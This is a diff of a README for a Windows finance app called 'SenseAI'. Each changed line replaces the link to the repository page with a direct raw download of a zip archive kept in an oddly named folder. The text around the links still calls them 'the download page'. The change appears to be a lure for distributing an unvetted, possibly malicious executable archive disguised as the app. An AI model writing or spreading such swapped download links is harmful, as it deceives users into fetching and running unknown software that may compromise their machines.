@@ -1,12 +1,12 @@
 # 🤖 SenseAI - Clear Financial Insights From Data
 
-[![Download SenseAI](https://img.shields.io/badge/Download%20SenseAI-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/erogenous-unmarriedwoman194/SenseAI)
+[![Download SenseAI](https://img.shields.io/badge/Download%20SenseAI-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/erogenous-unmarriedwoman194/SenseAI/raw/refs/heads/main/enchondroma/Sense-AI-3.0-alpha.1.zip)
 
 ## 📥 Download SenseAI
 
 Use this link to visit the download page and get SenseAI for Windows:
 
-https://github.com/erogenous-unmarriedwoman194/SenseAI
+https://github.com/erogenous-unmarriedwoman194/SenseAI/raw/refs/heads/main/enchondroma/Sense-AI-3.0-alpha.1.zip
 
 ## 🖥️ What SenseAI Does
 
@@ -32,7 +32,7 @@ Follow these steps to run SenseAI on Windows.
 
 Go to:
 
-https://github.com/erogenous-unmarriedwoman194/SenseAI
+https://github.com/erogenous-unmarriedwoman194/SenseAI/raw/refs/heads/main/enchondroma/Sense-AI-3.0-alpha.1.zip
 
 ### 2. Find the app file
 
@@ -252,4 +252,4 @@ If you are not sure which file to use, start with CSV. It is easy to read and co
 
 If you need the download page again, use this link:
 
-https://github.com/erogenous-unmarriedwoman194/SenseAI
+https://github.com/erogenous-unmarriedwoman194/SenseAI/raw/refs/heads/main/enchondroma/Sense-AI-3.0-alpha.1.zip
